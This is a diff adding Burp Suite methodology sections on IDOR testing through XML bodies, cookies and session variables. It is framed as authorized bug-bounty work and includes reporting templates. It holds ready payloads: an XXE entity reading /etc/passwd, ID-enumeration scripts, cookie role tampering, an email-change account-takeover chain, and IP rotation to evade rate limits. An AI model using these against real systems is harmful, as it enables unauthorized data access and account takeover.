@@ -10403,4 +10403,4364 @@ class BurpExtender(IBurpExtender, IHttpListener):
 ---
 
 
+# 🎯 **Bug #20: XML Body ID Manipulation - Complete Burp Suite Methodology**
+
+## **Understanding Bug #20 - XML Body ID Parameter Manipulation**
+
+This vulnerability occurs when an application uses XML data in requests and fails to properly validate authorization for object references within the XML structure.
+
+---
+
+## 📋 **PREREQUISITES & SETUP**
+
+### **Burp Suite Configuration**
+```
+1. Proxy → Intercept → ON
+2. Target → Scope → Add target domain
+3. Proxy → Options → Enable Intercept Client Requests
+4. Install Extensions (optional but recommended):
+   - XML Formatter
+   - Content Type Converter
+   - XSS Validator
+```
+
+### **Browser Configuration**
+```
+1. Set proxy to 127.0.0.1:8080
+2. Install Burp's CA certificate
+3. Enable "Intercept requests" in Burp
+```
+
+---
+
+## 🔍 **PHASE 1: RECONNAISSANCE & IDENTIFICATION**
+
+### **Step 1.1: Identify XML-Based Endpoints**
+
+**Manual Discovery:**
+```
+1. Monitor all POST/PUT requests with Content-Type: application/xml or text/xml
+2. Look for:
+   - SOAP APIs (/api/soap, /services, .asmx, .wcf)
+   - REST APIs accepting XML
+   - File uploads accepting XML
+   - Configuration endpoints
+```
+
+**Burp Filter Setup:**
+```
+Proxy → HTTP History → Filter:
+✓ Show only in-scope items
+✓ Filter by MIME type: XML
+✓ Filter by extension: .xml, .asmx, .svc
+```
+
+### **Step 1.2: Spider for XML Endpoints**
+
+**Using Burp Spider:**
+```
+Target → Site map → Right-click domain → Spider this host
+Configuration:
+- Maximum link depth: 3
+- Maximum children: 500
+- Check: "Request links in scope only"
+```
+
+**Using Burp Scanner (Passive):**
+```
+Target → Site map → Right-click → Passive Scan
+Watch for: XML content type responses
+```
+
+### **Step 1.3: Parameter Discovery**
+
+**Check Common XML Parameter Names:**
+```xml
+<!-- User identifiers -->
+<id>123</id>
+<userId>123</userId>
+<user_id>123</user_id>
+<accountId>123</accountId>
+<profileId>123</profileId>
+
+<!-- Document identifiers -->
+<docId>456</docId>
+<documentId>456</documentId>
+<fileId>456</fileId>
+
+<!-- Transaction identifiers -->
+<orderId>789</orderId>
+<transactionId>789</transactionId>
+<paymentId>789</paymentId>
+```
+
+**Burp Intruder Setup for Parameter Discovery:**
+```
+1. Send request to Intruder
+2. Positions → Clear §
+3. Select entire XML body
+4. Add wordlist of common parameter names
+5. Attack type: Sniper
+6. Payloads → Load parameter wordlist
+```
+
+---
+
+## 🧪 **PHASE 2: BASELINE TESTING**
+
+### **Step 2.1: Establish Normal Behavior**
+
+**Capture Original Request:**
+```xml
+POST /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/xml
+Authorization: Bearer your_token_here
+Content-Length: 156
+
+<?xml version="1.0" encoding="UTF-8"?>
+<request>
+    <action>viewProfile</action>
+    <userId>1001</userId>
+    <fields>
+        <field>name</field>
+        <field>email</field>
+    </fields>
+</request>
+```
+
+**Document Normal Response:**
+```xml
+HTTP/1.1 200 OK
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<response>
+    <status>success</status>
+    <data>
+        <name>John Doe</name>
+        <email>john@example.com</email>
+    </data>
+</response>
+```
+
+### **Step 2.2: Create Baseline Map**
+
+**Using Burp Comparer:**
+```
+1. Send multiple requests for your own ID (1001)
+2. Send requests for non-existent ID (999999)
+3. Send requests with invalid format
+4. Compare responses to establish patterns
+```
+
+**Document Response Patterns:**
+```python
+# Create a response pattern map
+Valid_own_200: "status>success</status"
+Valid_own_content: Contains personal data
+Invalid_ID_404: "status>error</status.*not found"
+Invalid_format_400: "status>error</status.*invalid"
+Unauthorized_403: "status>error</status.*unauthorized"
+```
+
+---
+
+## 🔬 **PHASE 3: SYSTEMATIC ID TESTING**
+
+### **Step 3.1: Sequential ID Testing**
+
+**Burp Intruder Configuration:**
+```
+1. Send original XML request to Intruder
+2. Positions → Highlight userId value (1001)
+3. Click "Add §" to mark position
+4. Attack type: Sniper
+
+Payloads:
+- Payload type: Numbers
+- Number range: 1-2000
+- Step: 1
+- Number format: Decimal
+```
+
+**Intruder Settings:**
+```
+Resource Pool:
+- Maximum concurrent requests: 5
+- Throttle between requests: 200ms
+
+Options:
+- Grep - Match: ["success", "error", "unauthorized"]
+- Grep - Extract: [Configure regex for user data]
+- Store requests/responses: Yes
+```
+
+### **Step 3.2: Targeted ID Testing from Previous Findings**
+
+**If you found valid IDs:**
+```
+1. Create custom wordlist from:
+   - Public profiles
+   - Error messages
+   - API documentation
+   - JavaScript files
+   
+2. Import wordlist into Intruder
+3. Test each ID systematically
+```
+
+---
+
+## 🎭 **PHASE 4: XML STRUCTURE MANIPULATION**
+
+### **Step 4.1: Parameter Location Variations**
+
+**Test Different XML Structures:**
+
+**Original:**
+```xml
+<userId>1001</userId>
+```
+
+**Variation 1 - Nested deeper:**
+```xml
+<request>
+    <user>
+        <details>
+            <id>1002</id>
+        </details>
+    </user>
+</request>
+```
+
+**Variation 2 - Attribute instead of element:**
+```xml
+<user id="1002">
+    <name>test</name>
+</user>
+```
+
+**Variation 3 - Multiple parameters:**
+```xml
+<request>
+    <userId>1002</userId>
+    <userId>1001</userId>  <!-- Which one is used? -->
+</request>
+```
+
+### **Step 4.2: XML Structure Fuzzing**
+
+**Burp Intruder - Multiple Positions:**
+```
+1. Mark multiple potential ID locations:
+   - <userId>§1001§</userId>
+   - <user id="§1001§">
+   - <id>§1001§</id>
+
+2. Attack type: Pitchfork or Cluster bomb
+3. Test different combinations
+```
+
+### **Step 4.3: XML Injection Techniques**
+
+**Test for XML Parsing Behavior:**
+```xml
+<!-- Test 1: Comments -->
+<userId>1001<!-- test --></userId>
+
+<!-- Test 2: CDATA -->
+<userId><![CDATA[1002]]></userId>
+
+<!-- Test 3: Entities -->
+<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<userId>&x;</userId>
+
+<!-- Test 4: Namespace manipulation -->
+<ns:userId xmlns:ns="http://target.com">1002</ns:userId>
+```
+
+---
+
+## 🔄 **PHASE 5: ENCODING & FORMAT BYPASSES**
+
+### **Step 5.1: Numeric Variations**
+
+**Test with Burp Intruder - Numbers Payload:**
+```
+Original: 1001
+
+Variations:
+- 1001.0 (float)
+- 01001 (leading zero)
+- +1001 (positive sign)
+- -1001 (negative - test if accepted)
+- 1001%00 (null byte)
+- 0x3E9 (hex)
+- 01751 (octal)
+- 1111101001 (binary)
+```
+
+### **Step 5.2: String Manipulations**
+
+**If ID is string-based:**
+```xml
+<!-- Original -->
+<username>john_doe</username>
+
+<!-- Test variations -->
+<username>admin</username>
+<username>administrator</username>
+<username>root</username>
+<username>system</username>
+<username>test%00</username>
+<username>../john_doe</username>
+```
+
+### **Step 5.3: Encoding Tests**
+
+**Create encoding payloads in Intruder:**
+```python
+# Payload processing rules:
+1. URL encode: %31%30%30%31
+2. Double URL encode: %2531%2530%2530%2531
+3. HTML entities: &#49;&#48;&#48;&#49;
+4. Unicode: \u0031\u0030\u0030\u0031
+5. Base64: MTAwMQ==
+```
+
+---
+
+## 📊 **PHASE 6: RESPONSE ANALYSIS**
+
+### **Step 6.1: Automated Analysis with Burp**
+
+**Configure Intruder Grep:**
+```
+Options → Grep - Match:
+Add items:
+- "John Doe" (your name)
+- "success"
+- "error"
+- "unauthorized"
+- "forbidden"
+- "not found"
+- "profile"
+- "email"
+```
+
+**Configure Grep - Extract:**
+```regex
+# Extract user data
+<name>(.*?)</name>
+<email>(.*?)</email>
+<id>(.*?)</id>
+```
+
+### **Step 6.2: Manual Response Analysis**
+
+**Create Analysis Checklist:**
+```markdown
+For each successful ID (200 OK):
+□ Does response contain other user's data?
+□ Is any PII exposed? (email, phone, address)
+□ Are there internal IDs exposed?
+□ Can you perform actions on this data?
+□ What's the authorization context?
+
+Document findings:
+ID: [tested_id]
+Endpoint: [URL]
+Original user: [your_id]
+Accessed user: [found_user]
+Data exposed: [list_fields]
+Sensitive level: [High/Medium/Low]
+```
+
+### **Step 6.3: Response Time Analysis**
+
+**Burp Intruder - Response Time:**
+```
+1. Add "Connection: close" header
+2. Monitor response times
+3. Look for anomalies:
+   - Valid IDs: 200-300ms
+   - Invalid IDs: 50-100ms
+   - Timing differences may indicate valid IDs
+```
+
+---
+
+## 🎯 **PHASE 7: EXPLOITATION & VERIFICATION**
+
+### **Step 7.1: Manual Verification**
+
+**For each promising finding:**
+```xml
+1. Log in as different user (if possible)
+2. Capture their valid ID
+3. Test cross-user access
+
+Example scenario:
+User A (ID: 1001) → Try accessing User B's data (ID: 1002)
+
+Request:
+POST /api/user/profile
+<userId>1002</userId>
+
+Response should NOT contain User B's data
+```
+
+### **Step 7.2: Exploit Chaining**
+
+**Test for further impact:**
+```xml
+<!-- If read access works, test write access -->
+<request>
+    <action>updateProfile</action>
+    <userId>1002</userId>
+    <profile>
+        <email>attacker@evil.com</email>
+    </profile>
+</request>
+```
+
+**Test for privilege escalation:**
+```xml
+<!-- Try accessing admin functions -->
+<request>
+    <action>admin_getAllUsers</action>
+    <userId>1001</userId>  <!-- Your ID, but action is admin -->
+</request>
+```
+
+### **Step 7.3: Business Logic Testing**
+
+**Test real-world impact scenarios:**
+```xml
+Scenario 1: Order manipulation
+POST /api/orders/view
+<orderId>12345</orderId>  <!-- Someone else's order -->
+
+Scenario 2: Password reset
+POST /api/reset-password
+<userId>1002</userId>  <!-- Trigger reset for other user -->
+
+Scenario 3: Payment info
+POST /api/payment/methods
+<userId>1002</userId>  <!-- View others' payment methods -->
+```
+
+---
+
+## 📝 **PHASE 8: DOCUMENTATION & REPORTING**
+
+### **Step 8.1: Create Proof of Concept**
+
+**Document each finding:**
+```markdown
+# IDOR Vulnerability Report
+
+## Finding ID: IDOR-XML-001
+**Endpoint:** POST /api/user/profile
+**Parameter:** userId in XML body
+**Original Value:** 1001 (current user)
+**Tested Value:** 1002 (victim user)
+
+## Request:
+POST /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/xml
+Authorization: Bearer [attacker_token]
+
+<?xml version="1.0"?>
+<request>
+    <userId>1002</userId>
+</request>
+
+## Response:
+HTTP/1.1 200 OK
+[Include sanitized response showing victim data]
+
+## Impact:
+Unauthorized access to victim's:
+- Full name
+- Email address
+- Phone number
+- Home address
+
+## CVSS Score: 7.5 (High)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: Low
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+```
+
+### **Step 8.2: Screenshot Evidence**
+
+**Using Burp:**
+```
+1. Right-click request → Save item
+2. Response → Right-click → Copy response to file
+3. Use Burp's "Comparer" for before/after evidence
+```
+
+---
+
+## 🛠️ **PHASE 9: ADVANCED BURP TECHNIQUES**
+
+### **9.1: Using Burp Extender**
+
+**Recommended Extensions:**
+```python
+1. **XML External Entity (XXE)**
+   - Automatically tests for XXE in XML
+   - Can help identify XML parsers
+
+2. **Content Type Converter**
+   - Convert between JSON/XML
+   - Test if endpoint accepts both
+
+3. **Turbo Intruder**
+   - Faster scanning
+   - Custom Python scripts
+   - Example script:
+```
+
+**Turbo Intruder Script:**
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+    
+    for i in range(1, 1000):
+        engine.queue(target.req, str(i))
+
+def handleResponse(req, interesting):
+    if '200' in req.response:
+        table.add(req)
+```
+
+### **9.2: Burp Macros for Authentication**
+
+**Setup Macro:**
+```
+Project options → Sessions → Macros → Add
+1. Record login sequence
+2. Add token extraction rules
+3. Link to session handling rules
+
+This maintains session during scanning
+```
+
+---
+
+## 🔍 **PHASE 10: TROUBLESHOOTING COMMON ISSUES**
+
+### **Issue 1: Rate Limiting**
+
+**Solutions:**
+```
+1. Add delays in Intruder:
+   Resource pool → Delay between requests: 1000ms
+
+2. Rotate IPs using:
+   - VPN
+   - Proxy chains
+   - AWS Lambda rotation
+
+3. Use Turbo Intruder with delays:
+   time.sleep(1)
+```
+
+### **Issue 2: CSRF Tokens**
+
+**Extract with Burp:**
+```
+1. Use session handling rules
+2. Create macro to extract CSRF from XML
+3. Apply to all requests
+
+Example regex for CSRF in XML:
+<csrfToken>(.*?)</csrfToken>
+```
+
+### **Issue 3: Complex XML Structures**
+
+**Use XPath to locate elements:**
+```xml
+<!-- If structure varies -->
+<envelope>
+    <body>
+        <getUser>
+            <params>
+                <id>1001</id>
+            </params>
+        </getUser>
+    </body>
+</envelope>
+
+<!-- Test different XPath-like traversals -->
+<id>1002</id>
+<params><id>1002</id></params>
+<getUser><id>1002</id></getUser>
+```
+
+---
+
+## ✅ **FINAL CHECKLIST**
+
+### **Testing Completion Checklist**
+```
+□ Identified all XML endpoints
+□ Tested sequential IDs (1-1000)
+□ Tested parameter location variations
+□ Tested encoding bypasses
+□ Tested XML structure manipulation
+□ Analyzed all 200 OK responses
+□ Manually verified findings
+□ Documented proof of concepts
+□ Checked for business logic impact
+□ Tested write operations where applicable
+□ Attempted privilege escalation
+□ Verified with multiple user accounts
+```
+
+### **Reporting Checklist**
+```
+□ Clear vulnerability description
+□ Step-by-step reproduction steps
+□ Request/response evidence
+□ Impact assessment
+□ CVSS score
+□ Remediation recommendations
+□ Screenshots attached
+□ No sensitive data in report
+```
+
+---
+
+## 📚 **ADDITIONAL RESOURCES**
+
+### **Burp Shortcuts for This Test**
+```
+Ctrl+R - Send to Repeater
+Ctrl+I - Send to Intruder
+Ctrl+F - Search responses
+Ctrl+Shift+B - Toggle base64 decode
+Ctrl+Shift+X - Send to Comparer
+```
+
+### **Common XML Namespaces to Test**
+```xml
+xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+```
+
+---
+
+## ⚠️ **SAFETY NOTES**
+
+1. **Always stay in scope**
+2. **Don't modify critical data**
+3. **Respect rate limits**
+4. **Stop if you find PII**
+5. **Report responsibly**
+6. **Don't escalate without permission**
+7. **Document everything**
+
+---
+
+## 🎯 **SUCCESS INDICATORS**
+
+**You've found Bug #20 when:**
+- ✅ Accessing userId=1002 returns different user's data
+- ✅ You can enumerate valid user IDs
+- ✅ XML parameter manipulation works
+- ✅ Authorization checks are missing
+- ✅ You can view/update other users' information
+
+---
+
+# 🎯 **Bug #21: Cookie Values IDOR - Complete Burp Suite Methodology**
+
+## **What is Bug #21?**
+IDOR vulnerability where object references are stored or passed through **cookie values** instead of URL parameters or POST bodies. This occurs when the application uses cookies to store user identifiers, resource IDs, or access tokens without proper authorization checks.
+
+---
+
+## 📊 **Cookie IDOR Attack Surface**
+
+### **Common Cookie Names to Test**
+```http
+# User Identifiers
+user_id
+userId
+uid
+user
+member_id
+account_id
+customer_id
+profile_id
+
+# Session/Resource Identifiers
+session_id
+cart_id
+order_id
+product_id
+document_id
+file_id
+message_id
+thread_id
+
+# Application Specific
+current_user
+selected_profile
+active_account
+viewing_as
+impersonate
+debug_user
+test_account
+```
+
+---
+
+## 🔍 **Phase 1: Reconnaissance & Cookie Discovery**
+
+### **Step 1: Map All Cookie Usages**
+
+1. **Passive Cookie Collection**
+```bash
+# Burp Suite - Proxy History Filter
+^Set-Cookie: | ^Cookie:
+```
+
+2. **Create Cookie Inventory**
+```http
+# Example Cookie Inventory Sheet
+Cookie Name        | Domain       | Path | HttpOnly | Secure | SameSite | Value Pattern
+------------------|--------------|------|----------|--------|----------|---------------
+user_id           | app.com      | /    | No       | Yes    | Lax      | numeric(1-1000)
+session_cart      | shop.com/cart| /cart| No       | No     | None     | uuid-v4
+admin_debug       | admin.app.com| /admin| Yes     | Yes    | Strict   | base64
+```
+
+### **Step 2: Understand Cookie Flow**
+
+```http
+# Track Cookie Through Requests
+1. Login Request → Server → Set-Cookie: user_id=100
+2. Profile Request → Cookie: user_id=100 → Profile Data
+3. Update Request → Cookie: user_id=100 → Update Operation
+4. Logout → Cookie Cleared/Modified
+```
+
+---
+
+## 🧪 **Phase 2: Manual Testing with Burp Suite**
+
+### **Step 1: Capture Baseline Request**
+
+```http
+GET /api/profile HTTP/1.1
+Host: example.com
+Cookie: user_id=100; session=abc123
+```
+
+### **Step 2: Cookie Manipulation in Burp Repeater**
+
+#### **A. Direct Value Modification**
+```http
+# Original
+GET /api/profile HTTP/1.1
+Cookie: user_id=100; session=abc123
+
+# Modified - Try Increment
+GET /api/profile HTTP/1.1
+Cookie: user_id=101; session=abc123
+
+# Modified - Try Decrement
+GET /api/profile HTTP/1.1
+Cookie: user_id=99; session=abc123
+
+# Modified - Try Admin ID
+GET /api/profile HTTP/1.1
+Cookie: user_id=1; session=abc123
+```
+
+#### **B. Cookie Format Variations**
+```http
+# Different Formats for user_id=100
+Cookie: user_id=100
+Cookie: userId=100
+Cookie: uid=100
+Cookie: UID=100
+Cookie: User-ID=100
+Cookie: user.id=100
+Cookie: user[id]=100
+Cookie: user%5Fid=100  # URL encoded
+Cookie: user_id="100"   # Quoted
+Cookie: user_id='100'   # Single quoted
+```
+
+---
+
+## 🤖 **Phase 3: Automated Testing with Burp Intruder**
+
+### **Step 1: Configure Attack Positions**
+
+```http
+GET /api/profile HTTP/1.1
+Host: example.com
+Cookie: user_id=§100§; session=abc123
+```
+
+### **Step 2: Payload Sets**
+
+#### **Payload Set 1: Numeric Enumeration**
+```python
+# Simple Range
+1-1000
+1000-2000
+5000-6000
+
+# Common IDs
+1, 2, 10, 100, 500, 1000, 1337, 9999
+
+# Admin/System IDs
+0, -1, 1, 999, 10000, 99999
+
+# Boundary Testing
+2147483647  # Max int
+4294967295  # Max unsigned int
+9223372036854775807  # Max bigint
+```
+
+#### **Payload Set 2: UUID/GUID Patterns**
+```python
+# Sequential UUIDs
+00000000-0000-0000-0000-000000000001
+00000000-0000-0000-0000-000000000002
+
+# Known patterns from logs
+550e8400-e29b-41d4-a716-446655440000
+
+# Null/Empty UUID
+00000000-0000-0000-0000-000000000000
+```
+
+#### **Payload Set 3: Encoded Values**
+```python
+# Base64 encoded IDs
+MTAw  # 100
+MTAx  # 101
+YWRtaW4=  # admin
+
+# Hex encoded
+0x64  # 100
+0x65  # 101
+
+# MD5 hashes (if IDs are hashed)
+md5(100) = f899139df5e1059396431415e770c6dd
+```
+
+### **Step 3: Attack Configuration**
+
+```python
+# Intruder Attack Types
+1. Sniper - Single position
+2. Battering ram - Same payload all positions
+3. Pitchfork - Different payload sets
+4. Cluster bomb - Combinations
+```
+
+### **Step 4: Resource Pools**
+```yaml
+# Configure to avoid rate limiting
+Pool Configuration:
+  - Maximum concurrent requests: 5
+  - Delay between requests: 200ms
+  - Retry on failure: 2 times
+  - Follow redirects: Never
+```
+
+---
+
+## 🎯 **Phase 4: Advanced Cookie Manipulation**
+
+### **Step 1: Cookie Deletion/Removal**
+
+```http
+# Test 1: Remove specific cookie
+GET /api/profile HTTP/1.1
+Cookie: session=abc123
+
+# Test 2: Remove all cookies
+GET /api/profile HTTP/1.1
+
+# Test 3: Empty cookie values
+GET /api/profile HTTP/1.1
+Cookie: user_id=; session=abc123
+```
+
+### **Step 2: Cookie Cloning/Replay**
+
+```http
+# Get victim cookie via another method (if possible)
+Cookie: user_id=101; session=xyz789
+
+# Replay with your session
+GET /api/profile HTTP/1.1
+Cookie: user_id=101; session=abc123
+```
+
+### **Step 3: Cookie Parameter Pollution**
+
+```http
+# Multiple cookie headers
+GET /api/profile HTTP/1.1
+Cookie: user_id=100
+Cookie: user_id=101
+
+# Cookie with duplicate parameters
+Cookie: user_id=100&user_id=101
+Cookie: user_id[]=100&user_id[]=101
+```
+
+---
+
+## 🔬 **Phase 5: Response Analysis Techniques**
+
+### **Step 1: Status Code Analysis**
+
+```python
+# Intruder Grep - Match patterns
+Status Codes:
+  200 OK - Potential success
+  403 Forbidden - Access denied but valid ID
+  404 Not Found - Invalid ID or resource
+  500 Internal Error - Possible injection
+  302 Redirect - May leak info in Location
+```
+
+### **Step 2: Content Length Analysis**
+
+```bash
+# Sort responses by content length
+# Different lengths often indicate valid/invalid IDs
+
+Content Length Patterns:
+  1250 bytes - Valid user profile
+  450 bytes - "Access Denied" message
+  230 bytes - "User not found" message
+  1250 bytes - Different user's profile
+```
+
+### **Step 3: Response Time Analysis**
+
+```python
+# Timing Attacks
+Response Times:
+  Valid ID: 150ms
+  Invalid ID: 50ms
+  Admin ID: 500ms (more data)
+```
+
+### **Step 4: Error Message Analysis**
+
+```http
+# Look for information leaks
+Response A: {"error": "User 100 not found"}
+Response B: {"error": "Invalid permissions"}
+Response C: {"profile": {"name": "John", "email": "..."}}
+```
+
+---
+
+## 🛠️ **Phase 6: Burp Extensions for Cookie IDOR**
+
+### **Essential Extensions**
+
+1. **Cookie Editor**
+```python
+# Quick cookie modification
+- Right-click request → Cookie Editor
+- Modify values on the fly
+- Save cookie sets for reuse
+```
+
+2. **AuthMatrix**
+```python
+# Test different user contexts
+User A Cookie → User A Actions
+User A Cookie → User B Actions
+User B Cookie → User A Actions
+```
+
+3. **Autorize**
+```python
+# Automatic authorization testing
+1. Set low-privilege cookie
+2. Set high-privilege endpoints
+3. Autorize tests automatically
+```
+
+### **Custom Extender Script**
+
+```python
+# Python script for cookie manipulation
+from burp import IBurpExtender, IIntruderPayloadGenerator
+import base64
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
+    def generatePayloads(self, base_value):
+        # Generate cookie variations
+        variations = []
+        
+        # Original value
+        variations.append(base_value)
+        
+        # Increment/decrement
+        if base_value.isdigit():
+            val = int(base_value)
+            variations.extend([str(val+i) for i in range(-10, 11)])
+        
+        # Encoded versions
+        variations.append(base64.b64encode(base_value))
+        variations.append(base64.b64encode(base_value).upper())
+        
+        # Hex encoding
+        if base_value.isdigit():
+            variations.append(hex(int(base_value)))
+        
+        return variations
+```
+
+---
+
+## 🎭 **Phase 7: Context-Specific Testing**
+
+### **Scenario 1: E-commerce Cart IDOR**
+
+```http
+# Test cart access via cookie
+GET /cart/items HTTP/1.1
+Cookie: cart_id=abc123; session=xyz789
+
+# Intruder payloads
+cart_id=§abc123§
+
+# Check for:
+- View other users' carts
+- Add items to others' carts
+- Modify quantities
+- Apply discounts
+- Checkout manipulation
+```
+
+### **Scenario 2: User Impersonation**
+
+```http
+# Admin impersonation cookie
+GET /admin/users HTTP/1.1
+Cookie: admin_session=xyz; user_id=§100§
+
+# Payloads
+1, 2, 3, ...  # Regular users
+0, -1, 9999   # System accounts
+"admin", "root", "superuser"  # Usernames
+```
+
+### **Scenario 3: Multi-tenant Applications**
+
+```http
+# Tenant switching via cookie
+GET /api/dashboard HTTP/1.1
+Cookie: tenant_id=§100§; user_id=500
+
+# Check for cross-tenant access
+- View other companies' data
+- Modify other tenants' settings
+- Access billing information
+```
+
+---
+
+## 📈 **Phase 8: Advanced Exploitation Chains**
+
+### **Chain 1: Cookie IDOR → Account Takeover**
+
+```http
+# Step 1: Find IDOR in profile update
+POST /profile/update HTTP/1.1
+Cookie: user_id=§100§
+Content-Type: application/json
+
+{"email":"attacker@evil.com"}
+
+# Step 2: If user_id=101 updates user 101's email
+# Step 3: Trigger password reset to new email
+# Step 4: Takeover account
+```
+
+### **Chain 2: Cookie IDOR → Privilege Escalation**
+
+```http
+# Step 1: Find role cookie
+Cookie: user_id=100; role=user; session=xyz
+
+# Step 2: Modify role
+Cookie: user_id=100; role=§admin§; session=xyz
+
+# Step 3: Access admin functions
+GET /admin/panel HTTP/1.1
+Cookie: role=admin; session=xyz
+```
+
+---
+
+## 🚨 **Phase 9: Detection Signatures**
+
+### **Indicators of Cookie IDOR**
+
+```yaml
+Green Flags (Vulnerable):
+  ✅ Different user data returned after cookie change
+  ✅ Status code 200 for other users' IDs
+  ✅ Response contains other users' PII
+  ✅ No CSRF/anti-CSRF for cookie changes
+  ✅ Rate limiting bypass possible
+
+Red Flags (Protected):
+  ❌ All requests return 403/401
+  ❌ Session invalidated on cookie change
+  ❌ Consistent error messages
+  ❌ Rate limiting triggered
+  ❌ CSRF tokens required
+```
+
+---
+
+## 📝 **Phase 10: Reporting Template**
+
+### **Bug Report Structure**
+
+```markdown
+# Title: IDOR via Cookie Manipulation in [Endpoint]
+
+## Description
+The application uses [cookie_name] to identify [resource/user] 
+without proper authorization checks, allowing attackers to 
+access/modify other users' data.
+
+## Steps to Reproduce
+1. Login as user A (ID: 100)
+2. Capture request: [request details]
+3. Modify cookie: [modification details]
+4. Observe response: [response details]
+
+## Proof of Concept
+```http
+Request:
+GET /api/profile HTTP/1.1
+Host: example.com
+Cookie: user_id=101; session=abc123
+
+Response:
+HTTP/1.1 200 OK
+{"name": "Victim User", "email": "victim@example.com"}
+```
+
+## Impact
+- Unauthorized access to [n] users' data
+- Potential account takeover
+- Data breach severity
+
+## Remediation
+- Implement server-side authorization
+- Use session-based user identification
+- Add CSRF tokens for sensitive operations
+- Implement rate limiting
+```
+
+---
+
+## 🛡️ **Mitigation Testing**
+
+### **Post-Fix Validation**
+
+```http
+# After fixes, test:
+1. Cookie tampering returns 403
+2. Session binding validated
+3. Rate limiting active
+4. Proper logging in place
+5. No information leakage
+```
+
+---
+
+## 📚 **Practice Labs for Cookie IDOR**
+
+1. **PortSwigger Labs**
+   - IDOR in cookie-based authentication
+   - Multi-step IDOR with cookies
+
+2. **PentesterLab**
+   - Cookie manipulation exercises
+   - Session fixation scenarios
+
+3. **HackTheBox**
+   - Machines with cookie-based IDOR
+   - Real-world scenarios
+
+---
+
+## ⚠️ **Important Notes**
+
+- **Authorization Required**: Always get written permission
+- **Scope Limitations**: Stay within defined boundaries
+- **Data Handling**: Never exfiltrate real user data
+- **Reporting**: Report responsibly through proper channels
+- **Documentation**: Keep detailed notes of all tests
+
+---
+
+# 🎯 **Bug #22: Session Variables IDOR - Full Burp Suite Methodology**
+
+## **What is Bug #22?**
+Testing IDOR vulnerabilities by modifying **Session Variables** and **Session-based References** - where object references are stored in or derived from session data.
+
+---
+
+## 📚 **TABLE OF CONTENTS**
+1. [Understanding Session-Based IDOR](#understanding)
+2. [Reconnaissance Phase](#reconnaissance)
+3. [Burp Configuration](#configuration)
+4. [Testing Methodology](#testing)
+5. [Advanced Techniques](#advanced)
+6. [Exploitation Scenarios](#exploitation)
+7. [Reporting Template](#reporting)
+
+---
+
+## 🔍 **UNDERSTANDING SESSION-BASED IDOR** {#understanding}
+
+### **What are Session Variables?**
+Session variables are server-side or client-side data that maintain user state across requests:
+- **Cookies** (PHPSESSID, JSESSIONID)
+- **JWT Tokens** in localStorage/sessionStorage
+- **Custom Headers** (X-User-ID, X-Session-Token)
+- **Hidden Form Fields** with session data
+- **URL Parameters** containing session references
+
+### **How Session IDOR Works**
+The application trusts session data for authorization without verifying:
+- User A's session contains `user_id=100`
+- Attacker modifies to `user_id=101`
+- Server processes request for user 101
+
+---
+
+## 🕵️ **RECONNAISSANCE PHASE** {#reconnaissance}
+
+### **Step 1: Map All Session Storage Locations**
+
+#### **Using Burp's Inspector:**
+1. Intercept a request after login
+2. Go to **Inspector > Cookies** tab
+3. Document all cookies:
+```
+PHPSESSID=abc123def456
+user_preferences=eyJ1c2VySWQiOjEwMH0=
+session_data=MTIzNDU2Nzg5
+```
+
+#### **Check Browser Storage (via Burp's Embedded Browser):**
+```javascript
+// Execute in Burp's browser console
+console.log("=== Local Storage ===");
+for(let i=0; i<localStorage.length; i++) {
+    console.log(localStorage.key(i) + ": " + localStorage.getItem(localStorage.key(i)));
+}
+
+console.log("=== Session Storage ===");
+for(let i=0; i<sessionStorage.length; i++) {
+    console.log(sessionStorage.key(i) + ": " + sessionStorage.getItem(sessionStorage.key(i)));
+}
+```
+
+### **Step 2: Identify Session-Based Parameters**
+
+#### **Create Custom Intruder Payload for Parameter Discovery:**
+1. Create a wordlist of common session parameters:
+```
+session
+session_id
+sessionid
+sid
+user_session
+session_data
+sessiontoken
+sess_id
+sessionKey
+session_token
+user_session_id
+auth_session
+session_key
+sessionId
+sessionID
+SESSIONID
+sessid
+SESSID
+sessionuser
+session_user
+session_user_id
+current_session
+active_session
+```
+
+2. **Burp Intruder Setup:**
+   - Position payload at each parameter
+   - Use **Sniper** attack
+   - Grep for differences in response length/status
+
+### **Step 3: Analyze Session Patterns**
+
+#### **Create Session Map:**
+```
+Target: https://example.com
+
+Session Storage Locations:
+├── Cookies
+│   ├── PHPSESSID (random 32-char)
+│   ├── user_token (JWT format)
+│   └── session_info (base64)
+├── Local Storage
+│   ├── user_preferences (JSON)
+│   └── session_data (encrypted)
+└── Custom Headers
+    └── X-Session-ID (in API requests)
+```
+
+---
+
+## ⚙️ **BURP CONFIGURATION** {#configuration}
+
+### **Step 1: Install Required Extensions**
+
+Go to **Extender > BApp Store** and install:
+
+1. **Session Variable Analyzer** (Custom extension)
+2. **JSON Web Tokens** - For JWT manipulation
+3. **Custom Parameter Handler** - For automated testing
+4. **Autorize** - For authorization checks
+5. **Auth Analyzer** - Session analysis
+
+### **Step 2: Configure Session Handling Rules**
+
+**Navigate to: Project Options > Sessions > Session Handling Rules**
+
+#### **Rule 1: Extract Session Variables**
+```
+Add Rule:
+- Description: "Extract session variables from responses"
+- Actions:
+  - Check "Extract session variables from response"
+  - Define regex patterns:
+    - user_id["\s]*:[\s]*(\d+)
+    - session_id["\s]*=[\s]*["']([^"']+)
+    - data-user-id=["'](\d+)
+```
+
+#### **Rule 2: Session Variable Modification**
+```
+Add Rule:
+- Description: "Auto-modify session variables"
+- Scope: All tools
+- Actions:
+  - Check "Modify session variables"
+  - Add custom modification rules
+```
+
+### **Step 3: Create Custom Session Tokens**
+
+**Project Options > Sessions > Session Handling Rules > Add > Run a macro**
+
+```yaml
+Macro Steps:
+1. Login request → Extract session token
+2. Profile request → Extract user ID
+3. Dashboard request → Extract session data
+4. Store all in session variables
+```
